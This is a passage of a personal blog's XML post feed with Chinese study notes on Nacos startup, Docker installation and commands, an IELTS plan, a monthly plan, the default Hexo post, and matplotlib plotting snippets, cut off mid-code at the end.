    <content><![CDATA[<h1 id="Nacos学习笔记"><a href="#Nacos学习笔记" class="headerlink" title="Nacos学习笔记"></a>Nacos学习笔记</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><ol>
<li>在nacos的bin目录内，执行命令：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 单机启动</span><br><span class="line">startup.cmd -m standalone</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>在浏览器访问本机的8848端口</li>
</ol>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2>]]></content>
      <categories>
        <category>编程技能</category>
      </categories>
      <tags>
        <tag>Nacos</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker学习笔记</title>
    <url>/2023/07/02/%E7%BC%96%E7%A8%8B%E6%8A%80%E8%83%BD/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="Docker学习笔记"><a href="#Docker学习笔记" class="headerlink" title="Docker学习笔记"></a>Docker学习笔记</h1><h2 id="Dokcer安装"><a href="#Dokcer安装" class="headerlink" title="Dokcer安装"></a>Dokcer安装</h2><h3 id="卸载原来的Docker"><a href="#卸载原来的Docker" class="headerlink" title="卸载原来的Docker"></a>卸载原来的Docker</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum remove docker \</span><br><span class="line">                   docker-client \</span><br><span class="line">                   docker-client-latest \</span><br><span class="line">                   docker-common \</span><br><span class="line">                   docker-latest \</span><br><span class="line">                   docker-latest-logrotate \</span><br><span class="line">                   docker-logrotate \</span><br><span class="line">                   docker-engine</span><br></pre></td></tr></table></figure>

<h3 id="下载Docker"><a href="#下载Docker" class="headerlink" title="下载Docker"></a>下载Docker</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y docker-ce</span><br></pre></td></tr></table></figure>

<h3 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#关闭</span><br><span class="line">systemctl stop firewalld</span><br><span class="line">#禁止开机启动防火墙 </span><br><span class="line">systemct1 disable firewalld</span><br></pre></td></tr></table></figure>

<h3 id="启动docker"><a href="#启动docker" class="headerlink" title="启动docker"></a>启动docker</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl start docker	#启动docker服务</span><br><span class="line">systemctl stop docker	#停止docker服务</span><br><span class="line">systemctl restart docker	#重启docker服务</span><br></pre></td></tr></table></figure>

<h3 id="配置阿里云仓库加速"><a href="#配置阿里云仓库加速" class="headerlink" title="配置阿里云仓库加速"></a>配置阿里云仓库加速</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p /etc/docker</span><br><span class="line"></span><br><span class="line">tee /etc/docker/daemon.json &lt;&lt;-&#x27;EOF&#x27;</span><br><span class="line">&#123;</span><br><span class="line">	&quot;registry-mirrors&quot;: [&quot;https://kskdqwg1.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>



<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h3><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看当前所有镜像</span></span><br><span class="line">doeker images</span><br><span class="line"><span class="comment"># 拉取镜像(下载镜像)</span></span><br><span class="line">docker pull</span><br><span class="line"><span class="comment"># 推送镜像</span></span><br><span class="line">docker push</span><br><span class="line"><span class="comment"># 保存镜像</span></span><br><span class="line">docker save</span><br><span class="line"><span class="comment"># 加载镜像</span></span><br><span class="line">docker load</span><br><span class="line"><span class="comment"># 删除镜像</span></span><br><span class="line">docker rmi</span><br></pre></td></tr></table></figure>
<h3 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 创建容器</span><br><span class="line">docker run </span><br><span class="line"># 暂停容器</span><br><span class="line">docker pause</span><br><span class="line"># 启动容器</span><br><span class="line">docker unpause</span><br><span class="line"># 关闭容器</span><br><span class="line">docker stop </span><br><span class="line"># 开启容器</span><br><span class="line">docker start</span><br><span class="line"># 查看所有容器的状态</span><br><span class="line">docker ps</span><br><span class="line"># 查看容器日志</span><br><span class="line">docker logs</span><br><span class="line"># 进入容器</span><br><span class="line">docker exec</span><br><span class="line"># 删除容器</span><br><span class="line">docker rm </span><br></pre></td></tr></table></figure>

<p><strong>特殊的语句</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 创建一个名为web的在nginx镜像为基础的容器</span><br><span class="line">docker run --name web -p 8888:80 -d nginx </span><br><span class="line"># 进入容器并且可以进行基础的shell语句进行输入输出</span><br><span class="line">docker exec -it web bash</span><br></pre></td></tr></table></figure>

<h3 id="数据卷"><a href="#数据卷" class="headerlink" title="数据卷"></a>数据卷</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 创建数据卷</span><br><span class="line">docker volume create</span><br><span class="line"># 查看数据卷的信息</span><br><span class="line">docker volume inspect</span><br><span class="line"># 列出所有的volume</span><br><span class="line">docker volume ls</span><br><span class="line"># 删除未使用的volume</span><br><span class="line">docker volume prune</span><br><span class="line"># 删除一个或多个指定的volume</span><br><span class="line">docker volume rm</span><br></pre></td></tr></table></figure>

<p><strong>样例</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 创建基于nginx镜像名为web的容器</span><br><span class="line">docker run --name web -p 8888:80 -d -v html:/usr/share/nginx/html nginx</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意： docker在创建容器的时候会自动创建数据卷。</p>
</blockquote>
<h3 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h3><p><img src="https://s2.loli.net/2023/07/03/pFz7x4cM65wje9S.png" alt="image-20230703010824707"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># FROM 表示，继承自哪个 image，这里继承的是官方的 node image，那么该 image 文件生成的容器实例是可以运行 node 命令的。image 版本为 8.4</span><br><span class="line">FROM node:8.4</span><br><span class="line"></span><br><span class="line"># COPY 表示，把主机的 . 目录里的文件复制到 image 文件的 /app 目录里（当然，要先忽略掉 .dockerignore 里的文件）</span><br><span class="line">COPY . /app</span><br><span class="line"></span><br><span class="line"># WORKDIR 表示，接下来的工作目录是 /app</span><br><span class="line">WORKDIR /app</span><br><span class="line"></span><br><span class="line"># RUN 表示，先通过 npm install 安装所有的依赖后，再打包进 image 文件。</span><br><span class="line">RUN [&quot;npm&quot;, &quot;install&quot;]</span><br><span class="line"></span><br><span class="line"># EXPOSE 表示把容器的 3000 端口暴露出来，以便和容器外部交互（本文后面会有例子）</span><br><span class="line">EXPOSE 3000</span><br><span class="line"></span><br><span class="line"># CMD 命令，表示在容器生成后执行的命令，这是和 RUN 的区别，一个在 image ，一个在 容器</span><br><span class="line">CMD node 01.js</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 可以基于jdk8的环境来构建镜像</span><br><span class="line">FROM java:8-alpine</span><br><span class="line"></span><br><span class="line">ENTRYPOINT 8090</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker build -t jdk:1.0</span><br></pre></td></tr></table></figure>

<h3 id="DockerCompose"><a href="#DockerCompose" class="headerlink" title="DockerCompose"></a>DockerCompose</h3><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><h3 id="为什么要有docker"><a href="#为什么要有docker" class="headerlink" title="为什么要有docker"></a>为什么要有docker</h3><h3 id="镜像-1"><a href="#镜像-1" class="headerlink" title="镜像"></a>镜像</h3><p>是一个只读的静态模板。它保存着容器需要的环境和应用的执行代码，可以把镜像看作容器的代码，当代码运行起来后就成了容器。镜像采用分层机制，每一层镜像都是只读的，但是可以将写数据的层通过联合文件系统附加到原有的镜像上。</p>
<h3 id="容器-1"><a href="#容器-1" class="headerlink" title="容器"></a>容器</h3><p>是一个运行时环境，它是一个镜像的运行状态，相对于静态的镜像而言。容器是镜像执行的动态表现，用户可以在容器中运行所想要的程序和服务，容器也不在乎你在什么样的环境下运行它。</p>
<h3 id="数据卷-1"><a href="#数据卷-1" class="headerlink" title="数据卷"></a>数据卷</h3><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1]: <a href="https://www.bilibili.com/video/BV1s54y1n7Ev/?spm_id_from=333.337.search-card.all.click&amp;vd_source=0433279976fad48ef00e33a4e0bdab91">https://www.bilibili.com/video/BV1s54y1n7Ev/?spm_id_from=333.337.search-card.all.click&amp;vd_source=0433279976fad48ef00e33a4e0bdab91</a>	“B站 Docker 10分钟快速入门Docker 10分钟快速入门”<br>[2]: <a href="https://www.bilibili.com/video/BV1LQ4y127n4?p=43&amp;vd_source=0433279976fad48ef00e33a4e0bdab91">https://www.bilibili.com/video/BV1LQ4y127n4?p=43&amp;vd_source=0433279976fad48ef00e33a4e0bdab91</a>	“B站 黑马程序员SpringCloud+RabbitMQ+Docker+Redis+搜索+分布式，系统详解springcloud微服务技术栈课程”</p>
<p>[3]: <a href="https://zhuanlan.zhihu.com/p/365455200">https://zhuanlan.zhihu.com/p/365455200</a>	“最新、最全、最详细的 Docker 学习笔记总结（2021最新版）”</p>
]]></content>
      <categories>
        <category>编程技能</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>RSS阅读器</title>
    <url>/2023/07/01/%E4%B8%AA%E4%BA%BA%E7%9A%84%E6%80%9D%E8%80%83/RSS%E9%98%85%E8%AF%BB%E5%99%A8/</url>
    <content><![CDATA[<h1 id="RSS阅读器"><a href="#RSS阅读器" class="headerlink" title="RSS阅读器"></a>RSS阅读器</h1><h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><p>脚注<a href="https://www.zhihu.com/question/19648264/answer/2629554375">^1</a>: </p>
<p>你好</p>
<p><code>为什么</code></p>
<h2 id="使用感受"><a href="#使用感受" class="headerlink" title="使用感受"></a>使用感受</h2><hr>
<p>爱仕达rr发afsad </p>
<p><a href="https://www.zhihu.com/question/19648264/answer/2629554375">1</a>: </p>
<p>Nihao<a href="https://www.zhihu.com/question/19648264/answer/2629554375">^1</a>nihao </p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><blockquote>
<p>你好</p>
</blockquote>
<p>$E &#x3D; mc^2$</p>
<p>fasdsdf asd fas</p>
]]></content>
      <tags>
        <tag>rss</tag>
      </tags>
  </entry>
  <entry>
    <title>雅思备考计划</title>
    <url>/2023/07/01/%E8%8B%B1%E8%AF%AD/IELTS%E5%A4%87%E8%80%83%E8%AE%A1%E5%88%92/</url>
    <content><![CDATA[<h1 id="雅思备考计划"><a href="#雅思备考计划" class="headerlink" title="雅思备考计划"></a>雅思备考计划</h1><h2 id="网上攻略"><a href="#网上攻略" class="headerlink" title="网上攻略"></a>网上攻略</h2><ol>
<li><a href="https://www.zhihu.com/question/25063485/answer/2537390866">https://www.zhihu.com/question/25063485/answer/2537390866</a></li>
<li></li>
</ol>
<h2 id="大体计划"><a href="#大体计划" class="headerlink" title="大体计划"></a>大体计划</h2><h3 id="复习材料"><a href="#复习材料" class="headerlink" title="复习材料"></a>复习材料</h3><ol>
<li>剑桥雅思真题系列</li>
<li>顾家北手把手教你雅思作文</li>
<li>刘洪波雅思真经系列</li>
<li>雅思王听力真题语料库</li>
<li>九分达人听力系列</li>
<li>雅思口语官方题库</li>
</ol>
<h2 id="专项练习"><a href="#专项练习" class="headerlink" title="专项练习"></a>专项练习</h2><h3 id="阅读"><a href="#阅读" class="headerlink" title="阅读"></a>阅读</h3><h3 id="听力"><a href="#听力" class="headerlink" title="听力"></a>听力</h3><h3 id="写作"><a href="#写作" class="headerlink" title="写作"></a>写作</h3><h3 id="口语"><a href="#口语" class="headerlink" title="口语"></a>口语</h3>]]></content>
      <categories>
        <category>英语</category>
      </categories>
      <tags>
        <tag>英语</tag>
        <tag>雅思</tag>
      </tags>
  </entry>
  <entry>
    <title>2023-07-MonthPlan</title>
    <url>/2023/07/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E8%BF%98%E6%9C%AA%E6%95%B4%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2023.07.MonthPlan/</url>
    <content><![CDATA[<h1 id="2023年7月学习计划"><a href="#2023年7月学习计划" class="headerlink" title="2023年7月学习计划"></a>2023年7月学习计划</h1><h2 id="上月总结"><a href="#上月总结" class="headerlink" title="上月总结"></a>上月总结</h2><p>1. </p>
<p>2. </p>
<p>3. </p>
<h2 id="规划"><a href="#规划" class="headerlink" title="规划"></a>规划</h2><p>1. </p>
<h2 id="Subject-to-Arrange"><a href="#Subject-to-Arrange" class="headerlink" title="Subject to Arrange"></a>Subject to Arrange</h2><h3 id="数学-x2F-科研"><a href="#数学-x2F-科研" class="headerlink" title="数学&#x2F;科研"></a>数学&#x2F;科研</h3><ol>
<li>完成实习任务</li>
<li></li>
</ol>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ol>
<li>要开始重新保持刷题的习惯了</li>
<li>完成操作系统的学习</li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ol>
<li>雅思开始进行有规律的复习</li>
</ol>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ol>
<li>将微服务学习完毕</li>
</ol>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>1. </p>
]]></content>
      <categories>
        <category>学习计划</category>
        <category>2023年</category>
        <category>7月</category>
      </categories>
      <tags>
        <tag>7月</tag>
        <tag>2023年</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2023/06/30/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>数据可视化</title>
    <url>/2023/03/01/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96/</url>
    <content><![CDATA[<h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><h3 id="导包"><a href="#导包" class="headerlink" title="导包"></a>导包</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br></pre></td></tr></table></figure>
<h3 id="显示中文"><a href="#显示中文" class="headerlink" title="显示中文"></a>显示中文</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 支持中文</span></span><br><span class="line">plt.rcParams[<span class="string">&#x27;font.sans-serif&#x27;</span>] = [<span class="string">&#x27;SimSun&#x27;</span>]  <span class="comment"># 用来正常显示中文标签</span></span><br><span class="line">plt.rcParams[<span class="string">&#x27;axes.unicode_minus&#x27;</span>] = <span class="literal">False</span>  <span class="comment"># 用来正常显示负号</span></span><br></pre></td></tr></table></figure>
<h3 id="将图片中的英文设置成新罗马"><a href="#将图片中的英文设置成新罗马" class="headerlink" title="将图片中的英文设置成新罗马"></a>将图片中的英文设置成新罗马</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt.rcParams[<span class="string">&#x27;font.sans-serif&#x27;</span>] = [<span class="string">&#x27;Times New Roman&#x27;</span>] </span><br><span class="line">plt.rcParams[<span class="string">&#x27;axes.unicode_minus&#x27;</span>] = <span class="literal">False</span>  <span class="comment"># 用来正常显示负号</span></span><br></pre></td></tr></table></figure>
<h3 id="设置全局字体"><a href="#设置全局字体" class="headerlink" title="设置全局字体"></a>设置全局字体</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt.rcParams[<span class="string">&#x27;font.size&#x27;</span>] = <span class="number">12</span> <span class="comment"># 小四字体</span></span><br></pre></td></tr></table></figure>
<h3 id="图片尺寸设置"><a href="#图片尺寸设置" class="headerlink" title="图片尺寸设置"></a>图片尺寸设置</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">A4大小的纸张，默认页边距为<span class="number">2.5</span>cm</span><br><span class="line">宽度范围：(<span class="number">17.72</span>cm, <span class="number">19.27</span>cm) 或 (<span class="number">6.97</span>英寸, <span class="number">7.59</span>英寸)</span><br><span class="line">高度范围：(<span class="number">23.19</span>cm, <span class="number">24.94</span>cm) 或 (<span class="number">9.13</span>英寸, <span class="number">9.81</span>英寸)</span><br><span class="line">figsize单位为英尺</span><br></pre></td></tr></table></figure>
<h3 id="调整全局样式"><a href="#调整全局样式" class="headerlink" title="调整全局样式"></a>调整全局样式</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt.rcParams[<span class="string">&#x27;lines.linewidth&#x27;</span>] = <span class="number">8</span></span><br><span class="line">plt.rcParams[<span class="string">&#x27;lines.color&#x27;</span>] = <span class="string">&quot;red&quot;</span></span><br><span class="line">plt.rcParams[<span class="string">&#x27;lines.linestyle&#x27;</span>] = <span class="string">&quot;--&quot;</span></span><br></pre></td></tr></table></figure>
<h3 id="基本操作-1"><a href="#基本操作-1" class="headerlink" title="基本操作"></a>基本操作</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt.figure(num=<span class="number">2</span>,figsize=(<span class="number">13</span>,<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">plt.plot(y_test, color=<span class="string">&quot;cornflowerblue&quot;</span>, linewidth=<span class="number">2.0</span>,linestyle=<span class="string">&quot;-&quot;</span>, label=<span class="string">&#x27;y_test&#x27;</span>)</span><br><span class="line">plt.plot(y_predict, color=<span class="string">&quot;darkorange&quot;</span>, linewidth=<span class="number">2.0</span>,linestyle=<span class="string">&quot;-&quot;</span>, label=<span class="string">&#x27;y_predict&#x27;</span>)</span><br><span class="line"></span><br><span class="line">figname = <span class="string">&#x27;Title&#x27;</span></span><br><span class="line">plt.title(figname)</span><br><span class="line"></span><br><span class="line">plt.xlabel(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">plt.xlim((-<span class="number">2</span>, <span class="number">4</span>))</span><br><span class="line">plt.ylim((-<span class="number">5</span>, <span class="number">15</span>))</span><br><span class="line"></span><br><span class="line">plt.legend()</span><br><span class="line"></span><br><span class="line">plt.savefig(<span class="string">&quot;&#123;&#125;.svg&quot;</span>.<span class="built_in">format</span>(figname), dpi=<span class="number">300</span>,<span class="built_in">format</span>=<span class="string">&quot;svg&quot;</span>, bbox_inches=<span class="string">&#x27;tight&#x27;</span>)</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<h3 id="导出图片"><a href="#导出图片" class="headerlink" title="导出图片"></a>导出图片</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">	plt.savefig(<span class="string">&quot;test&#123;&#125;.svg&quot;</span>.<span class="built_in">format</span>(i), dpi=<span class="number">300</span>,<span class="built_in">format</span>=<span class="string">&quot;svg&quot;</span>, bbox_inches=<span class="string">&#x27;tight&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过format可以批量导出图片</span></span><br><span class="line"><span class="comment"># format 保存的格式</span></span><br><span class="line"><span class="comment"># dpi画质</span></span><br></pre></td></tr></table></figure>
<h2 id="常见图片"><a href="#常见图片" class="headerlink" title="常见图片"></a>常见图片</h2><h3 id="热力图"><a href="#热力图" class="headerlink" title="热力图"></a>热力图</h3><h3 id="箱线图"><a href="#箱线图" class="headerlink" title="箱线图"></a>箱线图</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt.figure(figsize=(<span class="number">7.6</span>,<span class="number">2.5</span>))</span><br><span class="line">figname = <span class="string">&#x27;***箱线图&#x27;</span></span><br><span class="line">plt.title(figname)</span><br><span class="line">df.boxplot()</span><br><span class="line">plt.grid(<span class="literal">False</span>)  <span class="comment"># 显示网格</span></span><br><span class="line">plt.xlabel(<span class="string">&#x27;问题&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;数值&#x27;</span>)</span><br><span class="line">plt.savefig(<span class="string">&quot;&#123;&#125;.svg&quot;</span>.<span class="built_in">format</span>(figname), dpi=<span class="number">300</span>,<span class="built_in">format</span>=<span class="string">&quot;svg&quot;</span>, bbox_inches=<span class="string">&#x27;tight&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">labels = <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span></span><br><span class="line">A = [<span class="number">0.4978</span>, <span class="number">0.5764</span>, <span class="number">0.5073</span>, <span class="number">0.5609</span>]</span><br><span class="line">B = [<span class="number">0.5996</span>, <span class="number">0.65</span>, <span class="number">0.6251</span>, <span class="number">0.6473</span>]</span><br><span class="line">C = [<span class="number">0.6015</span>, <span class="number">0.687</span>, <span class="number">0.6237</span>, <span class="number">0.6761</span>]</span><br><span class="line">D = [<span class="number">0.5918</span>, <span class="number">0.6999</span>, <span class="number">0.6343</span>, <span class="number">0.6947</span>]</span><br><span class="line">E = [<span class="number">0.577</span>, <span class="number">0.6932</span>, <span class="number">0.6593</span>, <span class="number">0.7036</span>]</span><br><span class="line">F = [<span class="number">0.5637</span>, <span class="number">0.7161</span>, <span class="number">0.6683</span>, <span class="number">0.697</span>]</span><br><span class="line">plt.grid(<span class="literal">True</span>)  <span class="comment"># 显示网格</span></span><br><span class="line">plt.boxplot([A, B, C, D, E, F],</span><br><span class="line">            medianprops=&#123;<span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;linewidth&#x27;</span>: <span class="string">&#x27;1.5&#x27;</span>&#125;,</span><br><span class="line">            meanline=<span class="literal">True</span>,</span><br><span class="line">            showmeans=<span class="literal">True</span>,</span><br><span class="line">            meanprops=&#123;<span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;blue&#x27;</span>, <span class="string">&#x27;ls&#x27;</span>: <span class="string">&#x27;--&#x27;</span>, <span class="string">&#x27;linewidth&#x27;</span>: <span class="string">&#x27;1.5&#x27;</span>&#125;,</span><br><span class="line">            flierprops=&#123;<span class="string">&quot;marker&quot;</span>: <span class="string">&quot;o&quot;</span>, <span class="string">&quot;markerfacecolor&quot;</span>: <span class="string">&quot;red&quot;</span>, <span class="string">&quot;markersize&quot;</span>: <span class="number">10</span>&#125;,</span><br><span class="line">            labels=labels)</span><br><span class="line">plt.yticks(np.arange(<span class="number">0.4</span>, <span class="number">0.81</span>, <span class="number">0.1</span>))</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<h3 id="雷达图"><a href="#雷达图" class="headerlink" title="雷达图"></a>雷达图</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt.figure(figsize=(<span class="number">7.6</span>,<span class="number">5</span>))</span><br><span class="line">data=df.iloc[:, **].value_counts()</span><br><span class="line">dataset = pd.DataFrame(data)</span><br><span class="line"></span><br><span class="line">radar_labels=dataset.index</span><br><span class="line">nAttr=<span class="built_in">len</span>(dataset.index)</span><br><span class="line">nAttr</span><br><span class="line">data=dataset.values <span class="comment">#数据值</span></span><br><span class="line">data_labels=dataset.columns</span><br><span class="line"><span class="comment"># 设置角度</span></span><br><span class="line">angles=np.linspace(<span class="number">0</span>,<span class="number">2</span>*np.pi,nAttr,</span><br><span class="line">                   endpoint= <span class="literal">False</span>)</span><br><span class="line">data=np.concatenate((data, [data[<span class="number">0</span>]])) </span><br><span class="line">angles=np.concatenate((angles, [angles[<span class="number">0</span>]]))</span><br><span class="line"><span class="comment"># 设置画布</span></span><br><span class="line">fig=plt.figure(facecolor=<span class="string">&quot;white&quot;</span>,figsize=(<span class="number">7.6</span>,<span class="number">5</span>))</span><br><span class="line">plt.subplot( polar=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># 绘图</span></span><br><span class="line">plt.plot(angles,data,<span class="string">&#x27;o-&#x27;</span>,</span><br><span class="line">         linewidth=<span class="number">1.5</span>, alpha= <span class="number">0.2</span>)</span><br><span class="line"><span class="comment"># 填充颜色</span></span><br><span class="line">plt.fill(angles,data, alpha=<span class="number">0.25</span>) </span><br><span class="line">plt.thetagrids(angles[:-<span class="number">1</span>]*<span class="number">180</span>/np.pi, </span><br><span class="line">               radar_labels,<span class="number">1.2</span>) </span><br><span class="line"></span><br><span class="line">plt.setp(legend.get_texts(), </span><br><span class="line">         fontsize=<span class="string">&#x27;large&#x27;</span>) </span><br><span class="line">plt.grid(<span class="literal">True</span>)</span><br><span class="line">figname = <span class="string">&quot;**&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">plt.title(figname)</span><br><span class="line">plt.savefig(<span class="string">&quot;./雷达图/&#123;&#125;.svg&quot;</span>.<span class="built_in">format</span>(figname), dpi=<span class="number">300</span>,<span class="built_in">format</span>=<span class="string">&quot;svg&quot;</span>, bbox_inches=<span class="string">&#x27;tight&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<h3 id="条形图"><a href="#条形图" class="headerlink" title="条形图"></a>条形图</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入统计数据</span></span><br><span class="line">x_lable = (<span class="string">&#x27;站立&#x27;</span>, <span class="string">&#x27;静坐&#x27;</span>, <span class="string">&#x27;平躺&#x27;</span>, <span class="string">&#x27;行走&#x27;</span>, <span class="string">&#x27;上楼&#x27;</span>, <span class="string">&#x27;下楼&#x27;</span>)</span><br><span class="line">x_train_number = [<span class="number">1190</span>, <span class="number">1175</span>, <span class="number">800</span>, <span class="number">1200</span>, <span class="number">1380</span>, <span class="number">1360</span>]</span><br><span class="line">x_test_number = [<span class="number">580</span>, <span class="number">410</span>, <span class="number">400</span>, <span class="number">590</span>, <span class="number">570</span>, <span class="number">610</span>]</span><br><span class="line"></span><br><span class="line">bar_width = <span class="number">0.2</span>  <span class="comment"># 条形宽度</span></span><br><span class="line">index_x_train = np.arange(<span class="built_in">len</span>(x_lable))  <span class="comment"># 训练集条形图的横坐标</span></span><br><span class="line">index_x_test = index_x_train + bar_width  <span class="comment"># 测试集条形图的横坐标</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用两次 bar 函数画出两组条形图</span></span><br><span class="line">plt.bar(index_x_train, height=x_train_number, width=bar_width, color=<span class="string">&#x27;#0066CC&#x27;</span>, label=<span class="string">&#x27;训练集&#x27;</span>)</span><br><span class="line">plt.bar(index_x_test, height=x_test_number, width=bar_width, color=<span class="string">&#x27;#339966&#x27;</span>, label=<span class="string">&#x27;测试集&#x27;</span>)</span><br><span class="line"></span><br><span class="line">plt.legend(loc=<span class="string">&quot;upper left&quot;</span>, prop=&#123;<span class="string">&quot;size&quot;</span>: <span class="number">12</span>, &#125;)  <span class="comment"># 